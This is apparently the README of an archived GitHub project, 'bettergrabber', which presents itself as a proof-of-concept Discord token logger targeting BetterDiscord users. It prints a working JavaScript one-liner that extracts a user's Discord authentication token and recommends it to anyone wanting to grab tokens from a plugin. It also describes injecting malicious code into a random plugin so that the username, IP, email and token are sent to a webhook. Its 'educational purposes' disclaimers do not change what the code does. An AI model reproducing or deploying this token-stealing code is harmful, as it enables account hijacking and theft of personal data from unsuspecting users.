**UPDATE 09/18/2022**: This plugin no longer works. An update in both Webpack and BetterDiscord renders it useless, and thus this repository is archived.

To anyone looking for a way to grab user tokens from a plugin, this snippet from this [StackOverflow post](https://stackoverflow.com/questions/67348339/any-way-to-get-my-discord-token-from-browser-dev-console) still works as of writing:
```js
(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()
```
As with the warning below, this is for educational purposes. I take no responsibility for the malicious use of this code.

# bettergrabber

proof of concept discord token logger aimed at BetterDiscord users

this code is for educational purposes. if you use it with malicious intent, you are a dickhead.

## how does it work

essentially, if betterdiscord is installed, insert a malicious piece of code into the end of a random plugin. once the plugin is reloaded, the malicious code is executed, and the client's username, ip, email, and token are all sent to a webhook.
